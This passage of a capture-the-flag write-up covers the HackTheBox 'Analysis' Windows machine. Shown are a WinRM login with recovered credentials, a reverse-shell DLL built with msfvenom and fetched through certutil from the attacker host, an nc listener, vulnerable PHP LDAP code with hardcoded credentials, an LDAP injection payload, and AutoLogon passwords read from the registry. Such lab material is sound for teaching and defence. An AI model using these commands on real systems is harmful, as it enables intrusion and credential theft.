+<pre><code class="language-bash">❯ netexec winrm 10.10.11.250 -u 'jdoe' -p '7y4Z4^*y9Zzj'
+WINRM       10.10.11.250    5985   DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 (name:DC-ANALYSIS) (domain:analysis.htb)
+WINRM       10.10.11.250    5985   DC-ANALYSIS      [+] analysis.htb\jdoe:7y4Z4^*y9Zzj (Pwn3d!)
+</code></pre>
+
+<p>So we can evil-winrm to spawn a shell as jdoe and we can see user.txt:</p>
+
+<pre><code class="language-bash">❯ evil-winrm -i analysis.htb -u jdoe -p '7y4Z4^*y9Zzj'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\jdoe\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\jdoe\Desktop&gt; type user.txt
+49a9edaf8a129d8130e3e2e4674a7f82
+</code></pre>
+    
+      <h1 id="access-as-nt-authoritysystem">
+        
+        
+          Access as nt authority/system <a href="#access-as-nt-authoritysystem" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>In C:, we can see some strange files for some program called Snort:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\&gt; dir
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        6/12/2023  10:01 AM                inetpub
+d-----        11/5/2022   8:14 PM                PerfLogs
+d-----         5/8/2023  10:20 AM                PHP
+d-----         7/9/2023  10:54 AM                private
+d-r---       11/18/2023   9:56 AM                Program Files
+d-----         5/8/2023  10:11 AM                Program Files (x86)
+d-----         7/9/2023  10:57 AM                Snort
+d-r---        5/26/2023   2:20 PM                Users
+d-----        1/10/2024   3:52 PM                Windows
+-a----         6/8/2024   1:24 PM         291254 snortlog.txt
+
+
+*Evil-WinRM* PS C:\&gt; cd Snort
+*Evil-WinRM* PS C:\Snort&gt; dir
+
+
+    Directory: C:\Snort
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         7/8/2023   3:31 PM                bin
+d-----         7/8/2023   3:31 PM                etc
+d-----         7/8/2023   3:31 PM                lib
+d-----         6/8/2024   1:22 PM                log
+d-----         7/8/2023   3:31 PM                preproc_rules
+d-----       12/22/2023  12:54 PM                rules
+-a----         7/8/2023   3:31 PM          52666 Uninstall.exe
+</code></pre>
+
+<p>Searching in google, we can see that is a network intrusion detection system.</p>
+
+<p><img src="/assets/images/Analysis/what_is_snort.png" alt="What is snort" /></p>
+
+<p>We also have it’s documentation <a href="http://manual-snort-org.s3-website-us-east-1.amazonaws.com/">here</a></p>
+
+<p>In the running processes, we can see that snort is running:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Snort&gt; Get-Process | where {$_.ProcessName -notlike "svchost*"}
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+[...SNIP...]
+    162      18    62696      46652              1864   0 snort
+    470      23     5748      16688              2872   0 spoolsv
+   2070       0      192        148                 4   0 System
+    221      20     3900      12592       0.05   5408   1 taskhostw
+    335      17     3648      14584       0.11   2424   1 TextEncode
+    216      13     2700      10580       0.08   4124   1 TextEncode
+    212      15     2368      10344              3884   0 vds
+[...SNIP...]
+</code></pre>
+
+<p>A interesting functionality of snort is <a href="http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node23.html">Dynamic modules loading</a>, so let’s search for this configuration (<code>dynamicpreprocessor</code>) in snort.conf:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Snort&gt; cmd /c dir /r /s snort.conf
+ Volume in drive C has no label.
+ Volume Serial Number is 0071-E237
+
+ Directory of C:\Snort\etc
+
+07/08/2023  09:34 PM            23,094 snort.conf
+               1 File(s)         23,094 bytes
+
+     Total Files Listed:
+               1 File(s)         23,094 bytes
+               0 Dir(s)   4,136,046,592 bytes free
+*Evil-WinRM* PS C:\Snort&gt; cd etc
+*Evil-WinRM* PS C:\Snort\etc&gt; findstr dynamicpreprocessor snort.conf
+dynamicpreprocessor directory C:\Snort\lib\snort_dynamicpreprocessor
+</code></pre>
+
+<p>It’s using <code>C:\Snort\lib\snort_dynamicpreprocessor</code> as directory to load DLLs, so we can load a malicious DLL and perform a DLL injection because it’s running. In the case that the Administrator is who opens snort.exe, we will gain a reverse shell. For this I will use msfvenom:</p>
+
+<pre><code class="language-bash">❯ msfvenom -p windows/x64/shell_reverse_tcp -f dll -o test.dll LHOST=tun0 LPORT=443
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: test.dll
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+
+<p>Also, in another window, spawn a nc listener to receive the shell:</p>
+
+<pre><code class="language-bash">❯ nc -lvnp 443
+listening on [any] 443 ...
+
+</code></pre>
+
+<p>Download the test.dll in the library directory that is used and we receive the shell:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Snort\etc&gt; cd ..\lib\snort_dynamicpreprocessor
+*Evil-WinRM* PS C:\Snort\lib\snort_dynamicpreprocessor&gt; certutil.exe -f -urlcache -split http://10.10.14.225/test.dll
+****  Online  ****
+  0000  ...
+  2400
+CertUtil: -URLCache command completed successfully.
+*Evil-WinRM* PS C:\Snort\lib\snort_dynamicpreprocessor&gt; 
+</code></pre>
+
+<p>And we receive the shell as administrateur (which is Administrator in french):</p>
+
+<p><img src="/assets/images/Analysis/administrator_shell_received.png" alt="Administrator shell received" /></p>
+
+<p>Now we can see root.txt:</p>
+
+<pre><code class="language-powershell">
+C:\Windows\system32&gt;cd C:\Users\Administrateur
+cd C:\Users\Administrateur
+
+C:\Users\Administrateur&gt;cd Desktop
+cd Desktop
+
+C:\Users\Administrateur\Desktop&gt;type root.txt
+type root.txt
+b5****************************e6
+</code></pre>
+    
+      <h1 id="extra">
+        
+        
+          Extra <a href="#extra" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>In this section, we will see some of the reasons why this machine was vulnerable. In this case: LDAP injection, AutoLogon and the snort.exe scheduled task.</p>
+
+<p>For this, I will use ConPtyShell for Administrateur shell as we saw before.</p>
+    
+      <h2 id="ldap-injection">
+        
+        
+          LDAP injection <a href="#ldap-injection" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h2>
+
+<p>This is the code where LDAP injection is vulnerable (C:\inetpub\internal\users\list.php):</p>
+
+<pre><code class="language-php">&lt;?php 
+
+//LDAP Bind paramters, need to be a normal AD User account.
+error_reporting(0);
+$ldap_password = 'N1G6G46G@G!j';
+$ldap_username = 'webservice@analysis.htb';
+$ldap_connection = ldap_connect("analysis.htb");
+
+if(isset($_GET['name'])){
+    if (FALSE === $ldap_connection) {
+        // Uh-oh, something is wrong...
+        echo 'Unable to connect to the ldap server';
+    }
+
+// We have to set this option for the version of Active Directory we are using. 
+    ldap_set_option($ldap_connection, LDAP_OPT_PROTOCOL_VERSION, 3) or die('Unable to set LDAP protocol version');
+    ldap_set_option($ldap_connection, LDAP_OPT_REFERRALS, 0); // We need this for doing an LDAP search.
+
+    if (TRUE === ldap_bind($ldap_connection, $ldap_username, $ldap_password)) {
+
+        //Your domains DN to query
+        $ldap_base_dn = 'OU=sysadmins,DC=analysis,DC=htb';
+
+        //Get standard users and contacts
+        $search_filter = '(&amp;(objectCategory=person)(objectClass=user)(sAMAccountName='.$_GET['name'].'))';
+
+
+        //Connect to LDAP
+        $result = ldap_search($ldap_connection, $ldap_base_dn, $search_filter);
+
+        if (FALSE !== $result) {
+            $entries = ldap_get_entries($ldap_connection, $result);
+
+            // Uncomment the below if you want to write all entries to debug somethingthing
+            //var_dump($entries);
+
+            //Create a table to display the output
+            echo '&lt;h2&gt;Search result&lt;/h2&gt;&lt;/br&gt;';
+            echo '&lt;table border = "1"&gt;&lt;tr bgcolor="#cccccc"&gt;&lt;td&gt;Username&lt;/td&gt;&lt;td&gt;Last Name&lt;/td&gt;&lt;td&gt;First Name&lt;/td&gt;&lt;td&gt;Company&lt;/td&gt;&lt;td&gt;Department&lt;/td&gt;&lt;td&gt;Office Phone&lt;/td&gt;&lt;td&gt;Fax&lt;/td&gt;&lt;t
+d&gt;Mobile&lt;/td&gt;&lt;td&gt;DDI&lt;/td&gt;&lt;td&gt;E-Mail Address&lt;/td&gt;&lt;td&gt;Home Phone&lt;/td&gt;&lt;/tr&gt;';
+
+            //For each account returned by the search 
+
+
+            //
+            //Retrieve values from Active Directory
+            //
+
+            //Windows Usernaame
+            $LDAP_samaccountname = "";
+            $x=0;
+            $counter = 1;
+            if (!empty($entries[$x]['samaccountname'][0])) {
+                $LDAP_samaccountname = $entries[$x]['samaccountname'][0];
+                if ($LDAP_samaccountname == "NULL") {
+                    $LDAP_samaccountname = "";
+                }
+                if (strpos($_GET['name'], 'description=') !== false) {
+                    $start = strpos($_GET["name"], 'description=');
+                    $start += strlen("description=");
+                    $end = strrpos($_GET["name"], '*');
+                    $password = substr($_GET["name"], $start, $end - $start);
+                    $length = strlen($password);
+                    for ($i = 0; $i &lt; $length; $i++) {
+                        if($entries[$x]['description'][0][$i] != $password[$i]) {
+                            $LDAP_uSNCreated = $entries[$x]['usncreated'][0];
+                            $LDAP_samaccountname = "CONTACT_";
+                            $counter = 0;
+                            break;
+                        }
+                    }
+                }
+            } else {
+                //#There is no samaccountname s0 assume this is an AD contact record so generate a unique username
+
+                $LDAP_uSNCreated = $entries[$x]['usncreated'][0];
+                $LDAP_samaccountname = "CONTACT_" . $LDAP_uSNCreated;
+            }
+
+            //Last Name
+            $LDAP_LastName = "";
+
+            if (!empty($entries[$x]['sn'][0])) {
+                $LDAP_LastName = $entries[$x]['sn'][0];
+                if ($LDAP_LastName == "NULL") {
+                    $LDAP_LastName = "";
+                }
+            }
+
+            //First Name
+            $LDAP_FirstName = "";
+
+            if (!empty($entries[$x]['givenname'][0]) and $counter == 1) {
+                $LDAP_FirstName = $entries[$x]['givenname'][0];
+                if ($LDAP_FirstName == "NULL") {
+                    $LDAP_FirstName = "";
+                }
+            }
+
+            //Company
+            $LDAP_CompanyName = "";
+
+            if (!empty($entries[$x]['company'][0])) {
+                $LDAP_CompanyName = $entries[$x]['company'][0];
+                if ($LDAP_CompanyName == "NULL") {
+                    $LDAP_CompanyName = "";
+                }
+            }
+
+            //Department
+            $LDAP_Department = "";
+ 
+            if (!empty($entries[$x]['department'][0])) {
+                $LDAP_Department = $entries[$x]['department'][0];
+                if ($LDAP_Department == "NULL") {
+                    $LDAP_Department = "";
+                }
+            }
+
+            //Job Title
+            $LDAP_JobTitle = "";
+
+            if (!empty($entries[$x]['title'][0])) {
+                $LDAP_JobTitle = $entries[$x]['title'][0];
+                if ($LDAP_JobTitle == "NULL") {
+                    $LDAP_JobTitle = "";
+                }
+            } 
+
+            //IPPhone
+            $LDAP_OfficePhone = "";
+
+            if (!empty($entries[$x]['ipphone'][0])) {
+                $LDAP_OfficePhone = $entries[$x]['ipphone'][0];
+                if ($LDAP_OfficePhone == "NULL") {
+                    $LDAP_OfficePhone = "";
+                }
+            }
+
+            //FAX Number
+            $LDAP_OfficeFax = "";
+
+            if (!empty($entries[$x]['facsimiletelephonenumber'][0])) {
+                $LDAP_OfficeFax = $entries[$x]['facsimiletelephonenumber'][0];
+                if ($LDAP_OfficeFax == "NULL") {
+                    $LDAP_OfficeFax = "";
+                }
+            }
+
+            //Mobile Number
+            $LDAP_CellPhone = "";
+
+            if (!empty($entries[$x]['mobile'][0])) {
+                $LDAP_CellPhone = $entries[$x]['mobile'][0];
+                if ($LDAP_CellPhone == "NULL") {
+                    $LDAP_CellPhone = "";
+                }
+            }
+
+            //Telephone Number
+            $LDAP_DDI = "";
+
+            if (!empty($entries[$x]['telephonenumber'][0])) {
+                $LDAP_DDI = $entries[$x]['telephonenumber'][0];
+                if ($LDAP_DDI == "NULL") {
+                    $LDAP_DDI = "";
+                }
+            }
+
+            //Email address
+            $LDAP_InternetAddress = "";
+
+            if (!empty($entries[$x]['mail'][0])) {
+                $LDAP_InternetAddress = $entries[$x]['mail'][0];
+                if ($LDAP_InternetAddress == "NULL") {
+                    $LDAP_InternetAddress = "";
+                }
+            }
+
+            //Home phone
+            $LDAP_HomePhone = "";
+
+            if (!empty($entries[$x]['homephone'][0])) {
+                $LDAP_HomePhone = $entries[$x]['homephone'][0];
+                if ($LDAP_HomePhone == "NULL") {
+                    $LDAP_HomePhone = "";
+                } 
+            }
+
+            echo "&lt;tr&gt;&lt;td&gt;&lt;strong&gt;" . $LDAP_samaccountname . "&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;" . $LDAP_LastName . "&lt;/td&gt;&lt;td&gt;" . $LDAP_FirstName . "&lt;/td&gt;&lt;td&gt;" . $LDAP_CompanyName . "&lt;/td&gt;&lt;td&gt;" . $LD
+AP_Department . "&lt;/td&gt;&lt;td&gt;" . $LDAP_OfficePhone . "&lt;/td&gt;&lt;td&gt;" . $LDAP_OfficeFax . "&lt;/td&gt;&lt;td&gt;" . $LDAP_CellPhone . "&lt;/td&gt;&lt;td&gt;" . $LDAP_DDI . "&lt;/td&gt;&lt;td&gt;" . $LDAP_InternetAddress . "&lt;/td&gt;
+&lt;td&gt;" . $LDAP_HomePhone . "&lt;/td&gt;&lt;/tr&gt;";
+
+        } //END FALSE !== $result
+
+        ldap_unbind($ldap_connection); // Clean up after ourselves.
+        echo ("&lt;/table&gt;"); //close the table
+
+    } //END ldap_bind
+
+}
+</code></pre>
+
+<p>The problem is right here, due to that is not sanitizing any user input, we are able to inject the payload <code>*)(description=*</code> and the resulting query is <code>(&amp;(objectCategory=person)(objectClass=user)(sAMAccountName=*)(description=*))</code>:</p>
+
+<pre><code class="language-php">$search_filter = '(&amp;(objectCategory=person)(objectClass=user)(sAMAccountName='.$_GET['name'].'))';
+</code></pre>
+
+<p>That’s why we were able to bruteforce valid fields and the description of each user.</p>
+    
+      <h1 id="autologon">
+        
+        
+          AutoLogon <a href="#autologon" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>AutoLogon is a way to make that Windows automatically logs in the computer without you manually having to enter the credentials. You can read more <a href="https://www.hackingarticles.in/credential-dumping-windows-autologon-password/">here</a>. This credentials are stored in registry and that’s why we were able to saw it. WinPEAS do it automatically but we can also do it manually with a non-privileged user:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Snort\lib\snort_dynamicpreprocessor&gt; cd HKLM:
+*Evil-WinRM* PS HKLM:\&gt; cd "Software\Microsoft\Windows NT\CurrentVersion"
+*Evil-WinRM* PS HKLM:\Software\Microsoft\Windows NT\CurrentVersion&gt; Get-Item Winlogon
+
+
+    Hive: HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion
+
+
+Name                           Property
+----                           --------
+Winlogon                       AutoRestartShell             : 1
+                               Background                   : 0 0 0
+                               CachedLogonsCount            : 10
+                               DebugServerCommand           : no
+                               DefaultDomainName            : analysis.htb.
+                               DefaultUserName              : jdoe
+                               DisableBackButton            : 1
+                               EnableSIHostIntegration      : 1
+                               ForceUnlockLogon             : 0
+                               LegalNoticeCaption           :
+                               LegalNoticeText              :
+                               PasswordExpiryWarning        : 5
+                               PowerdownAfterShutdown       : 0
+                               PreCreateKnownFolders        : {A520A1A4-1780-4FF6-BD18-167343C5AF16}
+                               ReportBootOk                 : 1
+                               Shell                        : explorer.exe
+                               ShellCritical                : 0
+                               ShellInfrastructure          : sihost.exe
+                               SiHostCritical               : 0
+                               SiHostReadyTimeOut           : 0
+                               SiHostRestartCountLimit      : 0
+                               SiHostRestartTimeGap         : 0
+                               Userinit                     : C:\Windows\system32\userinit.exe,
+                               VMApplet                     : SystemPropertiesPerformance.exe /pagefile
+                               WinStationsDisabled          : 0
+                               ShellAppRuntime              : ShellAppRuntime.exe
+                               scremoveoption               : 0
+                               DisableCAD                   : 1
+                               LastLogOffEndTimePerfCounter : 7173375283
+                               ShutdownFlags                : 19
+                               DisableLockWorkstation       : 0
+                               AutoAdminLogon               : 1
+                               DefaultPassword              : 7y4Z4^*y9Zzj
+                               AutoLogonSID                 : S-1-5-21-916175351-3772503854-3498620144-1103
+                               LastUsedUsername             : jdoe
+</code></pre>
+    
+      <h1 id="snortexe">
+        
+        
+          snort.exe <a href="#snortexe" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p><code>snort.exe</code> is being executed by administrator each certain time in order for HackTheBox to simulate that a user is opening it. We can see the ScheduledTask here:</p>
+
+<pre><code class="language-powershell"># To see the scheduled tasks without showing the ones of windows
+PS C:\inetpub\internal\users&gt; Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+
+TaskName                          TaskPath   State 
+--------                          --------   -----
+CreateExplorerShellUnelevatedTask \          Ready
+npcapwatchdog                     \          Ready
+run_bctextencoder                 \          Ready
+run_simulate                      \        Running
+run_snort_check_script            \          Ready
+
+# To get the information of a task, we can use -TaskName parameter of Get-ScheduledTask and use Format-List to dump all data of the object:
+PS C:\&gt; Get-ScheduledTask -TaskName "run_snort_check_script" | Format-List                       
+
+
+Actions            : {MSFT_TaskExecAction}       
+Author             : ANALYSIS\Administrateur     
+Date               : 2023-07-09T10:51:08.3003508 
+Description        :
+Documentation      :
+Principal          : MSFT_TaskPrincipal2
+SecurityDescriptor :
+Settings           : MSFT_TaskSettings3
+Source             :
+State              : Running
+TaskName           : run_snort_check_script      
+TaskPath           : \
+Triggers           : {MSFT_TaskBootTrigger}      
+URI                : \run_snort_check_script     
+Version            :
+PSComputerName     :
+
+# Now to see the Actions (which is the file that executes), we can store the above command in a variable and dump $task.Actions:
+PS C:\&gt; $task = Get-ScheduledTask -TaskName "run_snort_check_script"
+PS C:\&gt; $task.Actions 
+
+
+Id               :
+Arguments        : -File C:\Users\Administrateur\AppData\Local\Automation\check.ps1 
+Execute          : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe        
+WorkingDirectory :
+PSComputerName   :
+</code></pre>
+
+<p>Now we can see that the file that executes is that powershell script, that looks like this:</p>
+
+<pre><code class="language-powershell">PS C:\&gt; type C:\Users\Administrateur\AppData\Local\Automation\check.ps1
+Stop-Service -Name "Snort"
+Get-ChildItem "C:\inetpub\logs\LogFiles\W3SVC2" | Select-String -Pattern "c2_malware_detected" | Select-Object -ExpandProperty path | ForEach-Object {Set-Content -Path $_ -Value $null}
+$Foldersize = Get-ChildItem "C:\Snort\log" -recurse | Measure-Object -property length -sum
+$Foldersize = [math]::Round(($FolderSize.sum / 1KB),2)
+Write-Host $Foldersize
+
+if($Foldersize -gt 0.5){
+
+    Write-Host "detected"
+        wget "http://internal.analysis.htb/dashboard/alert_panel.php?auth=1&amp;username=jdoe&amp;password=7y4Z4^*y9Zzj&amp;alert=c2_malware_detected"
+    Get-ChildItem -Path C:\Snort\log -Include *.* -File -Recurse | foreach { $_.Delete()}
+}
+
+Start-Service -Name "Snort"
+</code></pre>
+
+<p>There, it seems like it detects if in the new logs is the string “c2_malware_detected” and if the foldersize is more than 0.5, it makes a request to <code>http://internal.analysis.htb/dashboard/alert_panel.php?auth=1&amp;username=jdoe&amp;password=7y4Z4^*y9Zzj&amp;alert=c2_malware_detected</code>. That’s why you will see in some writeups that there is another way to have jdoe password, looking at the log files of inetpub:</p>
+
+<pre><code class="language-powershell">PS C:\inetpub\logs\LogFiles\W3SVC2&gt; findstr "alert_panel.php" .\u_ncsa1.log
+127.0.0.1 - - [08/Jun/2024:13:03:00 +0200] "GET /dashboard/alert_panel.php?auth=1&amp;username=jdoe&amp;password=7y4Z4%5E*y9Zzj&amp;alert=c2_malware_detected HTTP/1.1" 200 8924
+127.0.0.1 - - [08/Jun/2024:13:26:12 +0200] "GET /dashboard/alert_panel.php?auth=1&amp;username=jdoe&amp;password=7y4Z4%5E*y9Zzj&amp;alert=c2_malware_detected HTTP/1.1" 200 8924
+127.0.0.1 - - [08/Jun/2024:14:10:12 +0200] "GET /dashboard/alert_panel.php?auth=1&amp;username=jdoe&amp;password=7y4Z4%5E*y9Zzj&amp;alert=c2_malware_detected HTTP/1.1" 200 8924
+127.0.0.1 - - [08/Jun/2024:14:54:13 +0200] "GET /dashboard/alert_panel.php?auth=1&amp;username=jdoe&amp;password=7y4Z4%5E*y9Zzj&amp;alert=c2_malware_detected HTTP/1.1" 200 8924
+127.0.0.1 - - [08/Jun/2024:15:06:12 +0200] "GET /dashboard/alert_panel.php?auth=1&amp;username=jdoe&amp;password=7y4Z4%5E*y9Zzj&amp;alert=c2_malware_detected HTTP/1.1" 200 8924
+127.0.0.1 - - [08/Jun/2024:15:12:12 +0200] "GET /dashboard/alert_panel.php?auth=1&amp;username=jdoe&amp;password=7y4Z4%5E*y9Zzj&amp;alert=c2_malware_detected HTTP/1.1" 200 8924
+</code></pre>
+
+<p>Note that you have to urldecode the password to convert %5E to ^.</p>
+    
+      <h1 id="bctextencoder">
+        
+        
+          BCTextEncoder <a href="#bctextencoder" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
+        
+        
+      </h1>
+
+<p>As we saw above, there is also a task called <code>run_bctextencoder</code>, which was the principal idea to convert in Administrateur of the machine. Here, we have to make a lot of debugging and process injection and some very interesting but difficult things to decode the password that is stored in <code>C:\private\encoded.txt</code>. If you want to do it, it’s available in the official writeup.</p>
+
+<p>Well guys, that’s all the machine. Very interesting. Hope you liked it</p>
+
+
+<div id="share-links">
+  <span id="divider-line">____</span>
+  <br><br>
+  <small>5 June 2024</small>
+  <div>
+    
+    Tags:
+    
+    <a href="/search?q=fuzzing" class="tag" style="font-family: 'Cascadia Code';">fuzzing</a>
+    
+    <a href="/search?q=ldap-injection" class="tag" style="font-family: 'Cascadia Code';">ldap-injection</a>
+    
+    <a href="/search?q=php-shell" class="tag" style="font-family: 'Cascadia Code';">php-shell</a>
+    
+    <a href="/search?q=upload-vulnerabilities" class="tag" style="font-family: 'Cascadia Code';">upload-vulnerabilities</a>
+    
+    <a href="/search?q=autologon" class="tag" style="font-family: 'Cascadia Code';">autologon</a>
+    
+    <a href="/search?q=dll-injection" class="tag" style="font-family: 'Cascadia Code';">dll-injection</a>
+    
+    
+</div>
+  <br>
+  Share this writeup:&nbsp;
+  <a
+    href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/HTB/Analysis.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-facebook-official" aria-hidden="true"></i></a>&nbsp;
+  <a
+    href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/HTB/Analysis.html&text=Writeup+for+HTB Analysis Writeup+from+HTB+held+on+05 June 2024&hashtags=ctf,writeup,Analysis,HTB,fuzzing,ldap-injection,php-shell,upload-vulnerabilities,autologon,dll-injection','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-twitter" aria-hidden="true"></i></a>&nbsp;
+  <a
+    href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/HTB/Analysis.html&text=Writeup+for+HTB Analysis Writeup+from+HTB+held+on+2024-06-05 00:00:00 +0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-linkedin" aria-hidden="true"></i></a>
+</div>
+    </section>
+  </div>
+
+  <div id="comments" class="container">
+    <section id="disqus_container">
+      
+    </section>
+  </div>
+
+  <footer>
+    <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+  </footer>
+
+  <script src="http://localhost:4000/assets/js/prism.js"></script>
+  <button onclick="topFunction()" class="fa fa-arrow-up" id="top" title="Go to top"></button>
+  <script>
+    topScroll = document.getElementById("top");
+
+    window.onscroll = function () { scrollFunction() };
+
+    function scrollFunction() {
+      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+        topScroll.style.display = "block";
+      } else {
+        topScroll.style.display = "none";
+      }
+    }
+
+    function topFunction() {
+      document.body.scrollTop = 0;
+      document.documentElement.scrollTop = 0;
+    }
+
+    $(window).on('load', function () {
+
+      $('a[download]').each((i, e) => {
+        $(e).addClass('fa fa-download');
+      });
+
+      setSizes();
+    });
+
+    $(window).resize(setSizes);
+
+    function setSizes() {
+      if ($(window).width() < 960) {
+        $('#bottom-bar').hide();
+        $('footer').show();
+        $('#navbarSupportedContent').css('max-height', 'unset');
+        $('.navbar-collapse').collapse('hide');
+        if (document.body.clientHeight - $('#header').outerHeight() - $('#main_content').outerHeight() - $('#comments').outerHeight() < 150) {
+          $('footer').css("position", "unset");
+        } else {
+          $('footer').css("position", "fixed");
+        }
+      }
+      else {
+        $('#bottom-bar').show();
+        $('footer').hide();
+        $('.navbar-collapse').collapse('hide');
+        $('footer').css("position", "fixed");
+        $('#navbarSupportedContent').css('max-height', (document.body.clientHeight - $('.title-container').outerHeight() - $('#bottom-bar').outerHeight() - $('.navbar-toggler').outerHeight() - 50));
+      }
+    }
+  </script>
+
+</body>
+
+</html>
